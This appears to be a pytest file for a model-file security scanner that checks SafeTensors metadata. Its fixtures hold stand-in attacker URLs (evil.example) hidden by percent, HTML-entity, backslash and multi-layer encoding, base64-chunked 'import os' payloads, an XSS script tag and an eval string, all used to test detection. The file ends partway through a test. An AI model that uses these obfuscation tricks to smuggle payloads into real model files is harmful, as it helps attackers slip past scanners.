            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(2 <= len(chunk) <= 3 and "=" not in chunk for chunk in chunks)
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("payload_tail", "file_stem"),
    [
        (f"License grant {short_import_gadget_base64_tail()} under terms", "short_import_gadget"),
        ("Additional terms: h%74tps%3A%2F%2Fevil.example/x", "partially_encoded_url"),
        ("Additional terms: https://github.com/Lightricks/LTX-2/blob/main/license.pkl", "license_pkl_url"),
    ],
)
def test_license_metadata_review_regressions_route_in_nested_archive(
    tmp_path: Path,
    payload_tail: str,
    file_stem: str,
) -> None:
    source_file = tmp_path / f"{file_stem}.safetensors"
    archive_path = tmp_path / f"{file_stem}.zip"
    payload = f"{ordinary_license_text_with_url()}\n{payload_tail}"
    write_raw_safetensors(
        source_file,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.write(source_file, arcname="nested/model.safetensors")
    source_file.unlink()

    result = scan_model_directory_or_file(str(archive_path), cache_scan_results=False)

    assert any(
        issue.rule_code == "S905"
        and "license" in issue.message
        and str(archive_path) in (issue.location or "")
        and "nested/model.safetensors" in (issue.location or "")
        for issue in result.issues
    )


@pytest.mark.parametrize(
    "payload_tail",
    [
        "Additional terms: https%3A%5C%5Cevil.example%5Cx",
        "Additional terms: https:%5C%5Cevil.example%5Cx",
        "Additional terms: h%74tps%3A%5C%5Cevil.example%5Cx",
    ],
)
def test_license_metadata_encoded_backslash_url_delimiters_fail_closed(
    tmp_path: Path,
    payload_tail: str,
) -> None:
    file_path = tmp_path / "encoded_backslash_url_license_metadata.safetensors"
    payload = f"{ordinary_license_text_with_url()}\n{payload_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "payload_tail",
    [
        r"Additional terms: https:\\evil.example\payload",
        r"Additional terms: https:/\evil.example/payload",
        r"Additional terms: https:\/evil.example/payload",
        r"Additional terms: https:\evil.example/payload",
        "Additional terms: https:/evil.example/payload",
        r"Additional terms: http:\\evil.example\payload",
        r"Additional terms: http:\evil.example/payload",
        "Additional terms: http:/evil.example/payload",
    ],
)
def test_license_metadata_raw_backslash_url_delimiters_fail_closed(
    tmp_path: Path,
    payload_tail: str,
) -> None:
    file_path = tmp_path / "raw_backslash_url_license_metadata.safetensors"
    payload = f"{ordinary_license_text_with_url()}\n{payload_tail}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        and check.details.get("pattern") in {"https?://", "backslash-url-delimiter"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "encoded_url",
    [
        "https%3A%5C%5Cevil.example%5Cx",
        "https:%5C%5Cevil.example%5Cx",
        "h%74tps%3A%5C%5Cevil.example%5Cx",
        "%48%54%54%50%53%3A%5C%5Cevil.example%5Cx",
        "%2548%2554%2554%2550%2553%253A%255C%255Cevil.example%255Cx",
    ],
)
def test_license_metadata_short_encoded_backslash_url_delimiters_report_s905_without_raw_url(
    tmp_path: Path,
    encoded_url: str,
) -> None:
    file_path = tmp_path / "short_encoded_backslash_url_license_metadata.safetensors"
    payload = f"{ordinary_license_text_without_url()}\nEncoded reference: {encoded_url}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "encoded-url-delimiter"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "backslash_url",
    [
        r"https:\\evil.example\payload",
        r"https:/\evil.example/payload",
        r"https:\/evil.example/payload",
        r"https:\evil.example/payload",
        "https:/evil.example/payload",
        r"http:\\evil.example\payload",
        r"http:\evil.example/payload",
        "http:/evil.example/payload",
    ],
)
def test_license_metadata_short_raw_backslash_url_delimiters_report_s905_without_raw_url(
    tmp_path: Path,
    backslash_url: str,
) -> None:
    file_path = tmp_path / "short_raw_backslash_url_license_metadata.safetensors"
    payload = f"{ordinary_license_text_without_url()}\nReference: {backslash_url}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "backslash-url-delimiter"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "encoded_url",
    [
        "https&#x3a;&#x2f;&#x2f;evil.example/x",
        "https&#58;&#47;&#47;evil.example/x",
        "https&#x3a;&#x5c;&#x5c;evil.example&#x5c;x",
        "https&amp;#x3a;&amp;#x2f;&amp;#x2f;evil.example/x",
        "h&#x74;tps&#x3a;&#x2f;&#x2f;evil.example/x",
    ],
)
def test_license_metadata_short_entity_encoded_url_delimiters_report_s905_without_raw_url(
    tmp_path: Path,
    encoded_url: str,
) -> None:
    file_path = tmp_path / "short_entity_encoded_url_license_metadata.safetensors"
    payload = f"{ordinary_license_text_without_url()}\nEncoded reference: {encoded_url}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "encoded-url-delimiter"}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "encoded_url",
    [
        "https&amp;amp;#x3a;&amp;amp;#x2f;&amp;amp;#x2f;evil.example/x",
        "https&amp;amp;amp;amp;amp;#x3a;&amp;amp;amp;amp;amp;#x2f;&amp;amp;amp;amp;amp;#x2f;evil.example/x",
        "https&amp;amp;amp;amp;amp;amp;amp;amp;#x3a;&amp;amp;amp;amp;amp;amp;amp;amp;#x2f;&amp;amp;amp;amp;amp;amp;amp;amp;#x2f;evil.example/x",
        "h&amp;amp;amp;amp;amp;#x74;tps&amp;amp;amp;amp;amp;#x3a;&amp;amp;amp;amp;amp;#x2f;&amp;amp;amp;amp;amp;#x2f;evil.example/x",
    ],
)
def test_license_metadata_nested_entity_encoded_url_delimiter_fails_closed(
    tmp_path: Path,
    encoded_url: str,
) -> None:
    file_path = tmp_path / "nested_entity_encoded_url_license_metadata.safetensors"
    payload = f"{ordinary_license_text_without_url()}\nEncoded reference: {encoded_url}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "://" not in payload
    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "encoded-url-delimiter"}
        for check in result.checks
    )


@pytest.mark.parametrize("chunk_size", [1, 2, 3])
def test_license_metadata_short_bare_tiny_base64_chunks_report_s905_without_length_or_raw_url(
    tmp_path: Path,
    chunk_size: int,
) -> None:
    file_path = tmp_path / f"short_bare_{chunk_size}_char_base64_license_metadata.safetensors"
    encoded_payload = base64.b64encode(b"import os\n#payload").decode("ascii")
    chunks = [encoded_payload[index : index + chunk_size] for index in range(0, len(encoded_payload), chunk_size)]
    separator = "License grant terms."
    chunk_separator = f"\n{separator}\n"
    payload = "License agreement terms.\n" + chunk_separator.join(chunks)
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert all(1 <= len(chunk) <= 3 and "=" not in chunk for chunk in chunks)
    assert len(payload) < 1000
    assert "import " not in payload
    assert "http://" not in payload
    assert "https://" not in payload
    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "wrapped-opaque-token"}
        for check in result.checks
    )


def test_license_metadata_percent_encoded_backslash_text_without_url_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "short_encoded_backslash_text_license_metadata.safetensors"
    payload = (
        f"{ordinary_license_text_without_url()}\n"
        "Documentation note: %5C is a percent-encoded backslash in Windows path prose."
    )
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_raw_backslash_text_without_url_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "short_raw_backslash_text_license_metadata.safetensors"
    payload = f"{ordinary_license_text_without_url()}\nDocumentation note: C:\\models\\license is a local path example."
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_entity_encoded_backslash_text_without_url_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "short_entity_backslash_text_license_metadata.safetensors"
    payload = (
        f"{ordinary_license_text_without_url()}\n"
        "Documentation note: &#x5c; names a backslash, &amp;#x2f; names a slash, "
        "and C:&#x5c;models&#x5c;license is ordinary path prose."
    )
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert len(payload) < 1000
    assert "http://" not in payload
    assert "https://" not in payload
    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_trusted_url_with_unrelated_nested_entity_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "trusted_url_unrelated_nested_entity_license_metadata.safetensors"
    payload = (
        f"{ordinary_license_text_with_url()}\nDocumentation note: &amp;amp;amp;amp; is an escaped ampersand in prose."
    )
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "https://" in payload
    assert result.success is True
    assert result.metadata["custom_metadata_security_flags"] == []
    assert not [issue for issue in result.issues if issue.rule_code == "S905"]


def test_license_metadata_percent_encoded_backslash_text_stays_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "encoded_backslash_text_license_metadata.safetensors"
    payload = (
        f"{ordinary_license_text_with_url()}\n"
        "License notice: %5C is a percent-encoded backslash in Windows path documentation."
    )
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
    assert result.metadata["custom_metadata_security_flags"] == []
    assert all("license" not in issue.message for issue in result.issues)


def test_license_metadata_comment_separated_wrapped_base64_tail_routes_in_directory_shard_and_archive(
    tmp_path: Path,
) -> None:
    payload = f"{ordinary_license_text_with_url()}\n{comment_separated_executable_wrapped_base64_tail()}"
    header = {
        "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
        "__metadata__": {"license": payload},
    }
    direct_file = tmp_path / "direct.safetensors"
    shard_file = tmp_path / "model-00001-of-00001.safetensors"
    archive_source = tmp_path / "archive_member.safetensors"
    archive_path = tmp_path / "nested.zip"
    index_path = tmp_path / "model.safetensors.index.json"

    for path in (direct_file, shard_file, archive_source):
        write_raw_safetensors(path, header, b"\x00")
    index_path.write_text(
        json.dumps({"metadata": {"total_size": 1}, "weight_map": {"tensor": shard_file.name}}),
        encoding="utf-8",
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.write(archive_source, arcname="folder/inner.safetensors")
    archive_source.unlink()

    result = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    def slash_location(value: str | Path) -> str:
        return str(value).replace("\\", "/")

    metadata_pattern_locations = {
        slash_location(check.location)
        for check in result.checks
        if check.location
        if check.name == "Metadata Pattern Check"
        and check.status.value == "failed"
        and check.details.get("key") == "license"
        and check.details.get("pattern") == "https?://"
    }
    s905_locations = {
        slash_location(issue.location) for issue in result.issues if issue.rule_code == "S905" and issue.location
    }

    assert slash_location(direct_file) in s905_locations
    assert slash_location(direct_file) in metadata_pattern_locations
    assert any(location.endswith(f"/{shard_file.name}") for location in metadata_pattern_locations)
    assert any(
        slash_location(archive_path) in location and "folder/inner.safetensors" in location
        for location in metadata_pattern_locations
    )


def test_license_metadata_oversized_wrapped_base64_tail_fails_closed(tmp_path: Path) -> None:
    file_path = tmp_path / "license_metadata_oversized_wrapped_base64_tail.safetensors"
    documentary_padding = "\n".join(
        "License terms grant permission for use, reproduction, and distribution." for _ in range(130)
    )
    payload = (
        f"{ordinary_license_text_with_url()}\n{documentary_padding}\n{standard_wrapped_base64_tail(line_count=110)}"
    )
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == "license"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "url",
    [
        f"https://github.com/Lightricks/LTX-2/{encode_url_path('/releases/download/v1', passes=5)}/license",
        f"https://github.com/Lightricks/LTX-2/{encode_url_path('/raw/main/license.py', passes=5)}",
        f"https://github.com/Lightricks/LTX-2/blob/main/{encode_url_path('payload/license', passes=5)}",
        f"https://opensource.org/{encode_url_path('/licenses/MIT/download', passes=5)}",
        f"https://spdx.org/{encode_url_path('/licenses/MIT.json', passes=5)}",
    ],
)
def test_license_metadata_five_layer_encoded_license_url_fails_closed(tmp_path: Path, url: str) -> None:
    file_path = tmp_path / "license_metadata_five_layer_encoded_release_path.safetensors"
    payload = f"{ordinary_license_text_with_url()}\nAdditional terms: {url}"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"license": payload},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "license", "pattern": "https?://"}
        for check in result.checks
    )


@pytest.mark.parametrize("key", ["license_payload", "license_url_bypass", "licensee"])
def test_deceptive_license_metadata_keys_do_not_get_license_context(tmp_path: Path, key: str) -> None:
    file_path = tmp_path / "deceptive_license_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {key: ordinary_license_text_with_url()},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert "unusually_long_value" in result.metadata["custom_metadata_security_flags"]
    assert "suspicious_pattern" in result.metadata["custom_metadata_security_flags"]
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details.get("key") == key
        and check.details.get("pattern") == "https?://"
        for check in result.checks
    )


def test_non_license_metadata_url_still_reports_s905(tmp_path: Path) -> None:
    file_path = tmp_path / "non_license_url_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"homepage": "https://evil.example/payload"},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.metadata["custom_metadata_security_flags"] == ["suspicious_pattern"]
    assert any(issue.rule_code == "S905" for issue in result.issues)
    assert any(
        check.name == "Metadata Pattern Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "homepage", "pattern": "https?://"}
        for check in result.checks
    )


def test_malicious_long_non_license_metadata_still_reports_length(tmp_path: Path) -> None:
    file_path = tmp_path / "long_payload_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": {"payload": "A" * 1001},
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.metadata["custom_metadata_security_flags"] == ["unusually_long_value"]
    assert any(
        check.name == "Metadata Length Check"
        and check.status == CheckStatus.FAILED
        and check.details == {"key": "payload", "length": 1001, "threshold": 1000}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "custom_metadata",
    [None, "not-a-map", ["not-a-map"], {"owner": 7}, {"license": {"text": "MIT"}}],
    ids=["null", "string", "list", "non-string-value", "license-map"],
)
def test_malformed_safetensors_custom_metadata_is_inconclusive(tmp_path: Path, custom_metadata: Any) -> None:
    """SafeTensors custom metadata must be a string-to-string map."""
    file_path = tmp_path / "malformed_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": custom_metadata,
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert result.metadata["custom_metadata_valid"] is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_structure_validation_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "SafeTensors Metadata Structure Validation" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("custom_metadata", "expected_flags", "expected_check"),
    [
        (
            "<script>alert(1)</script>",
            ["suspicious_pattern", "xss_html_injection"],
            "SafeTensors XSS/HTML Injection Detection",
        ),
        (
            {"api_key": "SECRET_METADATA_TOKEN", "owner": 7},
            ["credential_exposure"],
            "SafeTensors Embedded Credentials Detection",
        ),
        (["eval(1)"], ["code_injection"], "SafeTensors Code Injection Detection"),
        (["https://evil.example/payload"], ["suspicious_pattern"], "Metadata Pattern Check"),
    ],
)
def test_malformed_safetensors_custom_metadata_still_reports_security_flags(
    tmp_path: Path,
    custom_metadata: Any,
    expected_flags: list[str],
    expected_check: str,
) -> None:
    """Malformed metadata should not bypass content detections."""
    file_path = tmp_path / "malformed_malicious_metadata.safetensors"
    write_raw_safetensors(
        file_path,
        {
            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
            "__metadata__": custom_metadata,
        },
        b"\x00",
    )

    result = SafeTensorsScanner().scan(str(file_path))

    assert result.success is False
    assert result.metadata["custom_metadata_valid"] is False
    assert result.metadata["custom_metadata_security_flags"] == expected_flags
    assert any(check.name == expected_check and check.status == CheckStatus.FAILED for check in result.checks)


def test_large_safetensors_scans_header_without_default_full_file_cap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    data_size = DEFAULT_MAX_FILE_READ_SIZE + 4096
    file_path = tmp_path / "large_model.safetensors"
    write_sparse_safetensors(
        file_path,
        {"weights": {"dtype": "U8", "shape": [data_size], "data_offsets": [0, data_size]}},
        data_size,
    )

    scanner = SafeTensorsScanner()
    monkeypatch.setattr(
        scanner,
        "calculate_file_hashes",
        lambda _path: {"md5": "0", "sha256": "0", "sha512": "0"},
    )

    result = scanner.scan(str(file_path))

    checks = {check.name: check for check in result.checks}
    assert checks["Header Length Validation"].status == CheckStatus.PASSED
    assert "File Size Limit" not in checks
    assert result.success is True
    assert result.metadata["file_size"] > DEFAULT_MAX_FILE_READ_SIZE


def _write_oversized_header_safetensors(path: Path, header_len: int) -> None:
    header_obj = {
        "__metadata__": {"safe": "value"},
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    header_prefix = json.dumps(header_obj, separators=(",", ":")).encode("utf-8")
    assert len(header_prefix) < header_len

    with open(path, "wb") as handle:
        handle.write(struct.pack("<Q", header_len))
        handle.write(header_prefix)

        remaining = header_len - len(header_prefix)
        chunk_size = 1024 * 1024
        for _ in range(remaining // chunk_size):
            handle.write(b" " * chunk_size)
        if remaining % chunk_size:
            handle.write(b" " * (remaining % chunk_size))

        handle.write(b"\x00\x00\x00\x00")


def test_oversized_header_returns_operational_exit2(tmp_path: Path) -> None:
    file_path = tmp_path / "oversized_header.safetensors"
    max_header_bytes = 1 * 1024 * 1024
    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)

    result = scan_model_directory_or_file(str(file_path), max_safetensors_header_bytes=max_header_bytes)

    assert result.success is False
    assert determine_exit_code(result) == 2
    limit_check = next(check for check in result.checks if check.name == "Header Size Limit")
    assert limit_check.severity == IssueSeverity.INFO


def test_oversized_header_triggers_limit_check(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    file_path = tmp_path / "oversized_header.safetensors"
    max_header_bytes = 1 * 1024 * 1024
    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)

    scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
    monkeypatch.setattr(
        scanner,
        "calculate_file_hashes",
        lambda _path: pytest.fail("oversized SafeTensors headers must be rejected before hashing"),
    )
    result = scanner.scan(str(file_path))

    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "failed"
    assert all(check.name != "File Integrity Hash" for check in result.checks)
    assert "exceeds maximum allowed size" in header_limit_check.message
    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_size_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    assert result.bytes_scanned == file_path.stat().st_size


def test_oversized_header_skips_metadata_content_analysis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    file_path = tmp_path / "oversized_skip_analysis.safetensors"
    max_header_bytes = 1 * 1024 * 1024
    _write_oversized_header_safetensors(file_path, header_len=max_header_bytes + 1)

    scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
    analyze_called = {"value": False}

    def track_analyze(metadata: dict[str, object], result: object, path: str) -> None:
        analyze_called["value"] = True

    monkeypatch.setattr(scanner, "_analyze_metadata_content", track_analyze)

    result = scanner.scan(str(file_path))

    assert analyze_called["value"] is False
    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "failed"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.success is False


def test_oversized_header_does_not_read_beyond_configured_limit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    file_path = tmp_path / "oversized_guarded_read.safetensors"
    max_header_bytes = 8 * 1024 * 1024
    oversized_header_len = max_header_bytes + 1
    _write_oversized_header_safetensors(file_path, header_len=oversized_header_len)

    original_open: Any = builtins.open

    class GuardedReader:
        def __init__(self, handle: BinaryIO) -> None:
            self._handle = handle
            self._total_read = 0

        def read(self, size: int = -1) -> bytes:
            if size > max_header_bytes:
                raise AssertionError(f"scanner attempted oversized read: {size}")
            chunk = self._handle.read(size)
            self._total_read += len(chunk)
            if self._total_read > 8:
                raise AssertionError(f"scanner read past the 8-byte header length field: {self._total_read}")
            return chunk

        def __enter__(self) -> "GuardedReader":
            self._handle.__enter__()
            return self

        def __exit__(
            self,
            exc_type: type[BaseException] | None,
            exc: BaseException | None,
            tb: TracebackType | None,
        ) -> Any:
            return self._handle.__exit__(exc_type, exc, tb)

        def __getattr__(self, name: str) -> Any:
            return getattr(self._handle, name)

    def guarded_open(
        file: str | os.PathLike[str] | int,
        mode: str = "r",
        *args: Any,
        **kwargs: Any,
    ) -> Any:
        handle = original_open(file, mode, *args, **kwargs)
        if isinstance(file, (str, os.PathLike)) and Path(file) == file_path and "rb" in mode:
            return GuardedReader(handle)
        return handle

    monkeypatch.setattr(builtins, "open", guarded_open)

    scanner = SafeTensorsScanner({"max_safetensors_header_bytes": max_header_bytes})
    result = scanner.scan(str(file_path))

    header_limit_check = next((check for check in result.checks if check.name == "Header Size Limit"), None)
    assert header_limit_check is not None
    assert header_limit_check.status.value == "failed"


def test_corrupted_header(tmp_path: Path) -> None:
    file_path = tmp_path / "model.safetensors"
    create_safetensors_file(file_path)

    corrupt_path = tmp_path / "corrupt.safetensors"
    with open(file_path, "rb") as f:
        data = bytearray(f.read())

    header_len = struct.unpack("<Q", data[:8])[0]
    header = data[8 : 8 + header_len]
    corrupt_header = header[:-10]  # truncate more to break JSON
    new_len = struct.pack("<Q", len(corrupt_header))
    corrupt_path.write_bytes(new_len + corrupt_header + data[8 + header_len :])

    scanner = SafeTensorsScanner()
    result = scanner.scan(str(corrupt_path))

    # Scanner may report corrupted header via has_errors or via issues/checks
    assert result.has_errors or len(result.issues) > 0 or len(result.checks) > 0
    # Check for JSON or header errors in issues or checks
    all_messages = [issue.message.lower() for issue in result.issues]
    all_messages.extend([check.message.lower() for check in result.checks])
    assert any("json" in msg or "header" in msg or "invalid" in msg or "corrupt" in msg for msg in all_messages)


def test_non_object_header_is_inconclusive_not_clean(tmp_path: Path) -> None:
    file_path = tmp_path / "array_header.safetensors"
    write_raw_safetensors_header(file_path, b"[]")

    direct = SafeTensorsScanner().scan(str(file_path))

    assert direct.success is False
    assert direct.has_errors is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "safetensors_header_validation_failed" in direct.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Header Format Validation" and check.status == CheckStatus.FAILED for check in direct.checks
    )
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in direct.issues)


def test_invalid_utf8_header_is_inconclusive_not_scanner_crash(tmp_path: Path) -> None:
    file_path = tmp_path / "invalid_utf8_header.safetensors"
    write_raw_safetensors_header(file_path, b"{\xff}")

    direct = SafeTensorsScanner().scan(str(file_path))

    assert direct.success is False
